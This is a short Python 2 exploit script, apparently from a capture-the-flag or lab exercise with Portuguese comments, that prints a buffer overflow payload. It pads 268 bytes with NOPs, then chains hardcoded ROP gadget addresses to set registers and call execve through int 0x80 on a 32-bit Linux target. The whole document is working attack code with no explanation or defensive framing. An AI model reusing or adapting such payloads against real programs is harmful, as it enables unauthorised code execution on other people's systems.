from struct import pack

p  = '\x90'*268
p += pack('<L', 0xf7f15a31) # pop edx, ecx, ebx ; ret
p += pack('<L', 0x8049f10)  # null em .init_array
p += pack('<L', 0x8049f10)  # null em .init_array
p += pack('<L', 0x8048194)  # GNU

p += pack('<L', 0xf7f0c052) # pop eax; ret
p += pack('<L', 0xb)        # execve

p += pack('<L', 0xf7e4a615) # int $0x80

print p
